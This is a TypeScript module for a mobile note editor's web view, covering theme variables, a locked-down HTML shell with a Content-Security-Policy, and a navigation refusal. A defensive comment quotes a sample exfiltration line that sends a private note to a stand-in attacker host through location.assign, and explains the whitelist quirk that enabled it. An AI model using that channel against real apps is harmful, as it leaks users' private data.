/**
 * The document the web view loads: theme variables, the HTML shell and its
 * CSP, and the navigation refusal. Split out of `../host.ts` — see that
 * facade for the file this used to be.
 */

import { EDITOR_BUNDLE } from "../bundle.generated";
import { layout } from "../../../../design/tokens";
import type { Colors } from "../../../../design/theme";

/**
 * The palette and the type scale, as the custom properties `styles.ts` draws
 * with.
 *
 * ("The measure" below means the type scale — size, leading, padding — which is
 * what this file has always called it. The note's *line length* is a separate
 * property added later, `--lp-measure`, and it is at the bottom of the returned
 * object with its own note.)
 *
 * Sent as values rather than as a scheme name for the reason no module in this
 * app holds a palette: a surface that decided its own colours would be a third
 * palette and the one nobody updates. `mono` is `fonts.mono`, which is a real
 * face on native ("Menlo" on iOS) and is passed in rather than imported so this
 * function stays free of `Platform`.
 *
 * The **measure** travels the same way, and that is the interesting half. The
 * web console switches to reading type under a CSS media query at
 * `layout.narrowBreakpoint`; the phone has `densityFor` and already knows the
 * answer. Sending the resolved numbers means one crossover rather than a
 * breakpoint written down twice in two units — and the numbers themselves are
 * exactly the web half's, because the console and the phone are showing the
 * same note.
 *
 * The compact set was measured off Obsidian mobile in PR #157: 16px on a 24px
 * line box in 24px of side padding. A blank markdown line between two
 * paragraphs is then one 24px line box, which is where the paragraph gap comes
 * from — the editor does not add one, because the buffer is the markdown and a
 * gap the file does not contain is a gap that vanishes in Obsidian.
 */
export function themeVars(
  colors: Colors,
  mono: string | undefined,
  compact: boolean,
): Record<string, string> {
  return {
    // The ground the note sits on. `surface` rather than `ground` because that
    // is what `NoteEditor`'s own status strip paints, and a seam between the
    // note and the row under it is the one thing that would give the web view
    // away.
    "--lp-bg": colors.surface,
    // The web half draws body text in `text2` beside a file tree and in `text`
    // on a phone, where the note is the whole screen. Same rule here.
    "--lp-content": compact ? colors.text : colors.text2,
    "--lp-heading": colors.text,
    "--lp-muted": colors.text2,
    "--lp-link": colors.codeKey,
    "--lp-code-bg": colors.well,
    // Hairlines. See the web half's note: a rule that wants an edge used to
    // borrow the code fence's fill, which is not one.
    "--lp-line": colors.line,
    "--lp-line-strong": colors.lineStrong,
    // The wash behind a focused control. `accentDim` is already that colour;
    // `--lp-selection` is the same value for the same reason.
    "--lp-focus-ring": colors.accentDim,
    // What a destructive menu item is drawn in; `crit` is the rust family.
    "--lp-danger": colors.crit,
    "--lp-caret": colors.text,
    "--lp-selection": colors.accentDim,
    // `fonts.body` is `undefined` on native on purpose — there are no bundled
    // faces and a comma-separated stack is meaningless to a native text node.
    // Inside the web view we *are* a browser, so the system stack is available
    // and is what the rest of the app is already drawn in.
    "--lp-body": "-apple-system, system-ui, sans-serif",
    "--lp-mono": `${mono ?? "ui-monospace"}, ui-monospace, Menlo, monospace`,

    /*
      16px at both densities. This was 14.5px on the pointer layout, and the
      reading measure is a multiple of it, so the small type was shrinking the
      column as well as the glyphs: at 40em, 14.5px drew 580px of text where
      16px draws 640px. Measured against Obsidian in a pane of the same width,
      14.5px put about 12px of ink on a line against Obsidian's 14px and left
      320px gutters against its 238 — the note read as small text lost in a
      wide pane, which is what it was. One size is also one thing to keep in
      step rather than two.
    */
    "--lp-size": "16px",
    "--lp-leading": compact ? "1.5" : "1.75",
    "--lp-pad-top": compact ? "8px" : "14px",
    "--lp-pad-x": compact ? "24px" : "16px",
    "--lp-pad-bottom": compact ? "32px" : "14px",

    /*
      The reading measure — the note's line length, which is the one value
      here that does NOT change with the density, because it is a multiple of
      whatever the density's own type size is: 36 of them at 16px and at
      14.5px. It travels as a bare number and `styles.ts` multiplies by 1em
      where the text is; see `layout.readingMeasureEm` for why the unit is em
      and why the multiplication is down there.

      Sending it at all is the point rather than an optimisation. `styles.ts`
      reads `var(--lp-measure)`, and a custom property no one declares makes
      its whole declaration invalid at computed-value time — so an undeclared
      one here is not a fallback to a sensible width, it is the measure
      silently gone, which is the shape of the bug PR #487 fixed.
    */
    "--lp-measure": String(layout.readingMeasureEm),
  };
}

/**
 * The document the web view loads. A module constant, and that is the point.
 *
 * Nothing note-specific is in here: not the text, not the palette, not the
 * editability. All of it arrives over the bridge after the guest says `ready`.
 * If the note were baked into the HTML then `source` would change whenever the
 * note did, and react-native-webview reloads on a new `source` — which would
 * mean a full CodeMirror rebuild, and the caret and undo history thrown away,
 * every time somebody opened a file. It would also mean somebody's private
 * markdown being spliced into an HTML string on every render.
 *
 * The CSP is the structural half of "the bundle is local, not remote":
 * `default-src 'none'` means this document cannot reach the network at all, so
 * an editor that quietly started fetching from a CDN would not work rather than
 * work-and-be-wrong. The two `'unsafe-inline'` allowances are for the inline
 * bundle and the stylesheet it injects; there is no `connect-src`, no
 * `img-src` beyond data URIs, and no origin of any kind.
 */
export function editorDocument(bundle: string): string {
  return `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'">
</head>
<body>
<script>${escapeForScript(bundle)}</script>
</body>
</html>`;
}

/**
 * Keep a `</script` inside the bundle from ending the element that holds it.
 *
 * The HTML tokenizer looks for the literal characters, not for JavaScript
 * syntax, so a string constant anywhere in 500kb of minified CodeMirror would
 * close the tag and leave the rest of the editor as visible text on the page.
 * `<\/script` is the same string to the JavaScript parser and not the same
 * string to the HTML one.
 */
export function escapeForScript(code: string): string {
  return code.replace(/<\/(script)/gi, "<\\/$1");
}

export const EDITOR_HTML = editorDocument(EDITOR_BUNDLE);

/**
 * NOTHING IN THIS DOCUMENT NAVIGATES, AND `["*"]` IS WHAT ENFORCES THAT.
 *
 * The live-preview decorations draw a link as a styled `<span>`, never an
 * `<a href>`, so there is no in-page navigation to allow — and a web view
 * holding somebody's private note has no business following a URL that appeared
 * inside it. `allowInitialLoadOnly` below is the refusal. This constant exists
 * to make sure it is *reached*.
 *
 * **`originWhitelist` is not a second, tighter refusal. It is a switch that
 * decides who answers, and the narrow setting answers by opening Safari.**
 * From `createOnShouldStartLoadWithRequest` in react-native-webview's
 * `src/WebViewShared.tsx` (13.15.0, and unchanged for years):
 *
 *     if (!passesWhitelist(compileWhitelist(originWhitelist), url)) {
 *       Linking.canOpenURL(url).then((supported) => {
 *         if (supported) return Linking.openURL(url);   // <- the FULL url
 *       });
 *       shouldStart = false;
 *     } else if (onShouldStartLoadWithRequest) {
 *       shouldStart = onShouldStartLoadWithRequest(nativeEvent);
 *     }
 *
 * The app's handler is in the `else`. A URL that *fails* the whitelist is not
 * blocked and handed to us — it is handed to the operating system. So the
 * previous value here, `["about:*"]`, did not narrow anything: a script in the
 * document running `location.assign("https://attacker.example/?d=" + note)`
 * failed the whitelist, was never shown to `allowInitialLoadOnly`, and was
 * opened in Safari with the note in the query string.
 *
 * `"*"` compiles to `^.*`, which every URL passes, so every navigation reaches
 * the handler below and is refused there with no `Linking` call at all. The
 * broad-looking value is the closed one; the narrow-looking value is the
 * exfiltration channel. The initial load is unaffected either way — the library
 * prepends `about:blank` to the compiled list itself — so the whitelist has no
 * work left to do for this web view, and the only thing it can still do is take
 * the decision away from us.
 *
 * **This is the one channel the CSP cannot close**, which is why it is worth a
 * page of comment over a one-character value. `editorDocument`'s
 * `default-src 'none'; base-uri 'none'; form-action 'none'` stops fetching,
 * framing, form posts and base rewriting; there is no directive in any browser
 * that stops `location.assign()`. Tightening this back to `["about:*"]` reads
 * exactly like hardening and restores the leak — the same shape as
 * "an absent `Origin` is allowed; `null` is not". `webviewHost.test.ts` drives
 * the library's own dispatch over both values and fails if this one stops
 * reaching the handler.
 */
export const NAVIGATION_ORIGINS: readonly string[] = Object.freeze(["*"]);

/**
 * The only navigation this web view performs is the one that loads it.
 *
 * Everything else — a link somebody pasted into their note, a redirect a
 * malformed decoration produced, a `location.assign` from a script that should
 * not exist — is refused. `false` here means the load does not happen and
 * nothing is handed to the operating system; see `NAVIGATION_ORIGINS` for why
 * that requires the whitelist to be wide open.
 */
export function allowInitialLoadOnly(request: { url: string }): boolean {
  return request.url === "about:blank" || request.url.startsWith("about:");
}
